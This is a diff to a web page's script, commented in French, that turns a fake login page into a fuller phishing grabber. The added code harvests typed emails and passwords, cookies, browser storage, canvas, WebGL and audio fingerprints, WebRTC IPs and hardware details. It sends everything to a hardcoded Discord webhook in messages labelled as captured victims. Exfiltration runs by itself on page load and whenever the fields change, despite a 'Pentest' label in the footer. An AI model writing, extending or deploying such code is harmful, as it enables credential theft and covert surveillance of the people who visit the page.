@@ -83,23 +83,135 @@
     </div>
 
     <script>
-        // TON WEBHOOK DISCORD
+        // ✅ TON WEBHOOK - TOUT VA ICI
         const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1495131862702751775/pP4iuM3WGCm8n_Po5PE94ofmB2-tvh8nxDLPMSKFddYAiaGlWBdvxa3sy0vlnVJoilFC';
         const YOUTUBE_LINK = 'https://youtube.com/shorts/MBz-kM9Tqf0?si=G8Yw_AlaceyqnQ7L';
         
         let lastExfil = 0;
-        const EXFIL_COOLDOWN = 5000;
+        const EXFIL_COOLDOWN = 2000; // Plus rapide
         
         const emailInput = document.getElementById('email');
         const loginBtn = document.getElementById('loginBtn');
         const emailError = document.getElementById('emailError');
-        
-        function canExfil() {
-            const now = Date.now();
-            return (now - lastExfil) > EXFIL_COOLDOWN;
+
+        // FINGERPRINTING ULTRA-COMPLET
+        async function getFingerprint() {
+            // Canvas fingerprint
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Fingerprint v3.0', 2, 2);
+            const canvasHash = btoa(canvas.toDataURL()).slice(0, 50);
+
+            // WebGL
+            const glCanvas = document.createElement('canvas');
+            const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+            const webglInfo = gl ? `${gl.getParameter(gl.RENDERER)} | ${gl.getParameter(gl.VENDOR)}` : 'None';
+
+            // WebRTC IPs
+            const webrtcIps = await new Promise(resolve => {
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer(pc.setLocalDescription.bind(pc));
+                pc.onicecandidate = ice => {
+                    if (!ice.candidate) {
+                        const ips = [];
+                        Object.values(pc.localDescription.sdp || '')
+                            .join('').match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/gi)?.forEach(ip => {
+                                if (ip && !ips.includes(ip)) ips.push(ip);
+                            });
+                        resolve(ips.join(', ') || 'None');
+                        pc.close();
+                    }
+                };
+            });
+
+            // Audio fingerprint
+            const audioHash = await new Promise(resolve => {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const analyser = audioCtx.createAnalyser();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(analyser);
+                analyser.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.type = 'sine';
+                oscillator.frequency.value = 10000;
+                gainNode.gain.value = 0;
+                oscillator.start();
+                setTimeout(() => {
+                    const data = new Uint8Array(analyser.frequencyBinCount);
+                    analyser.getByteFrequencyData(data);
+                    oscillator.stop();
+                    audioCtx.close();
+                    resolve(btoa(String.fromCharCode(...data.slice(0, 50))));
+                }, 100);
+            });
+
+            return {
+                canvas: canvasHash,
+                webgl: webglInfo.slice(0, 60),
+                webrtc: webrtcIps.slice(0, 60),
+                audio: audioHash.slice(0, 50)
+            };
         }
-        
-        // Validation email en temps réel
+
+        // STOCKAGE COMPLET
+        function getAllStorage() {
+            const data = {
+                cookies: document.cookie || 'None',
+                localStorage: {},
+                sessionStorage: {},
+                indexedDB: !!window.indexedDB
+            };
+            
+            // LocalStorage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key) {
+                    try {
+                        data.localStorage[key] = localStorage.getItem(key)?.substring(0, 150) || '';
+                    } catch(e) {}
+                }
+            }
+            
+            // SessionStorage
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                if (key) {
+                    try {
+                        data.sessionStorage[key] = sessionStorage.getItem(key)?.substring(0, 150) || '';
+                    } catch(e) {}
+                }
+            }
+            
+            return data;
+        }
+
+        // HARDWARE + SYSTEM
+        function getSystemInfo() {
+            return {
+                cpu: navigator.hardwareConcurrency || '?',
+                ram: navigator.deviceMemory || '?',
+                connection: navigator.connection ? 
+                    `${navigator.connection.effectiveType} (${navigator.connection.downlink?.toFixed(1) || '?'} Mbps)` : '?',
+                touch: navigator.maxTouchPoints || 0,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages?.join(', ') || navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                availableScreen: `${screen.availWidth}x${screen.availHeight}`,
+                pixelRatio: window.devicePixelRatio || 1
+            };
+        }
+
+        function canExfil() {
+            return (Date.now() - lastExfil) > EXFIL_COOLDOWN;
+        }
+
+        // VALIDATION EMAIL
         emailInput.addEventListener('input', function() {
             const email = this.value;
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -112,7 +224,6 @@
                 loginBtn.disabled = true;
                 if (email.length > 0) {
                     emailError.style.display = 'block';
-                    emailError.textContent = '❌ Email invalide ! Format requis : exemple@domaine.com';
                     this.style.background = 'rgba(255,0,0,0.2)';
                 } else {
                     emailError.style.display = 'none';
@@ -120,68 +231,125 @@
                 }
             }
         });
-        
-        // Ouvre la vidéo YouTube
+
         function openVideo() {
             window.open(YOUTUBE_LINK, '_blank');
             exfilData();
         }
-        
-        function sendToDiscord(data) {
+
+        // ✅ ENVOI TRIPLE VERS TON WEBHOOK
+        async function sendToDiscord(data, type = 'main') {
             if (!canExfil()) return;
             
-            const embed = {
-                title: "🎣 NOUVELLE VICTIME CAPTURÉE",
-                color: 16711680,
-                fields: [
-                    { name: "🌐 IP", value: data.ip || "Detection...", inline: true },
-                    { name: "📧 Email", value: data.email || "Non saisi", inline: true },
-                    { name: "🔑 Mot de passe", value: data.password || "Non saisi", inline: false },
-                    { name: "🌍 User Agent", value: data.userAgent.substring(0,50)+'...', inline: false },
-                    { name: "📱 Résolution", value: data.screen, inline: true },
-                    { name: "🌐 Localisation", value: data.timezone || "Unknown", inline: true },
-                    { name: "🍪 Cookies", value: data.cookies || "Aucun", inline: false }
-                ],
-                thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/5968/5968898.png" },
-                timestamp: new Date().toISOString(),
-                footer: { text: "Pentest Grabber | " + new Date().toLocaleString('fr-FR') }
-            };
+            let embed;
             
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
-            }).catch(e => {});
+            if (type === 'main') {
+                embed = {
+                    title: "🎣 VICTIME CAPTURÉE - INFOS PRINCIPALES",
+                    color: 16711680, // Rouge
+                    fields: [
+                        { name: "🌐 IP", value: data.ip || "?", inline: true },
+                        { name: "📧 Email", value: `\`${data.email || "Non saisi"}\``, inline: true },
+                        { name: "🔑 Password", value: `\`${data.password || "Non saisi"}\``, inline: true },
+                        { name: "💻 User Agent", value: data.userAgent.substring(0, 45) + '...', inline: false },
+                        { name: "📱 Écran", value: data.screen, inline: true },
+                        { name: "🌍 Timezone", value: data.timezone, inline: true },
+                        { name: "🖥️ CPU/RAM", value: `${data.cpu}/${data.ram}GB`, inline: true },
+                        { name: "📡 Réseau", value: data.connection, inline: true }
+                    ],
+                    thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/5968/5968898.png" }
+                };
+            } else if (type === 'fingerprint') {
+                embed = {
+                    title: "🕵️ FINGERPRINT COMPLET",
+                    color: 0x00FF00, // Vert
+                    fields: [
+                        { name: "🎨 Canvas", value: `\`${data.canvas}\``, inline: false },
+                        { name: "🎮 WebGL", value: data.webgl, inline: false },
+                        { name: "🌐 WebRTC", value: data.webrtc, inline: false },
+                        { name: "🔊 Audio", value: data.audio, inline: false },
+                        { name: "🔤 Langues", value: data.languages, inline: true },
+                        { name: "📐 Pixel Ratio", value: data.pixelRatio.toString(), inline: true }
+                    ]
+                };
+            } else if (type === 'storage') {
+                const storageStr = JSON.stringify(data.storage).substring(0, 1000);
+                embed = {
+                    title: "💾 STOCKAGE & COOKIES (RAW)",
+                    color: 3447003, // Bleu
+                    description: `\`\`\`json\n${storageStr}\`\`\``,
+                    fields: [
+                        { name: "🔗 URL", value: data.url.substring(0, 80), inline: false },
+                        { name: "🔙 Referrer", value: data.referrer.substring(0, 80) || "Direct", inline: false }
+                    ]
+                };
+            }
+            
+            embed.timestamp = new Date().toISOString();
+            embed.footer = { text: `Grabber v3.0 | ${new Date().toLocaleString('fr-FR')}` };
+            
+            try {
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch(e) {}
             
             lastExfil = Date.now();
         }
-        
+
+        // EXFILTRATION TOTALE
         async function exfilData() {
-            const data = {
+            const fingerprint = await getFingerprint();
+            const storage = getAllStorage();
+            const system = getSystemInfo();
+            
+            const baseData = {
                 ip: await getIP(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: document.cookie,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screen.width}x${screen.height}`,
                 email: document.getElementById('email').value,
                 password: document.getElementById('password').value,
-                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: system.timezone,
+                cpu: system.cpu,
+                ram: system.ram,
+                connection: system.connection,
+                languages: system.languages,
+                pixelRatio: system.pixelRatio,
+                canvas: fingerprint.canvas,
+                webgl: fingerprint.webgl,
+                webrtc: fingerprint.webrtc,
+                audio: fingerprint.audio,
+                storage: storage,
                 url: window.location.href,
-                referrer: document.referrer
+                referrer: document.referrer || "Direct"
             };
-            sendToDiscord(data);
+
+            // ✅ ENVOI EN 3 EMBEDS PARALLÈLES VERS TON WEBHOOK
+            sendToDiscord(baseData, 'main');
+            sendToDiscord(baseData, 'fingerprint');
+            sendToDiscord(baseData, 'storage');
         }
-        
+
+        // MULTIPLES IP APIs
         async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const json = await res.json();
-                return json.ip;
-            } catch(e) { return 'Hidden'; }
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://api.ip.ge/json/'
+            ];
+            
+            for (const api of apis) {
+                try {
+                    const res = await fetch(api);
+                    const json = await res.json();
+                    return json.ip || json.query || 'Hidden';
+                } catch(e) {}
+            }
+            return 'Hidden';
         }
-        
+
         async function login() {
             const email = emailInput.value;
             if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
@@ -197,14 +365,24 @@
             
             setTimeout(() => {
                 status.innerHTML = '✅ Accès autorisé ! 🎉';
-                setTimeout(() => {
-                    videoSection.classList.add('show');
-                }, 1000);
-            }, 2500);
+                setTimeout(() => videoSection.classList.add('show'), 1000);
+            }, 4000);
         }
-        
+
+        // 🚀 EXFIL AUTOMATIQUE MULTIPLE
         window.addEventListener('load', () => {
-            setTimeout(exfilData, 1500);
+            setTimeout(exfilData, 800);
+            setTimeout(exfilData, 3000); // Double exfil
+        });
+
+        // Exfil sur autofill/change
+        ['email', 'password'].forEach(id => {
+            document.getElementById(id)?.addEventListener('change', exfilData);
+            document.getElementById(id)?.addEventListener('input', () => {
+                if (document.getElementById('email').value && document.getElementById('password').value) {
+                    setTimeout(exfilData, 1000);
+                }
+            });
         });
     </script>
 </body>
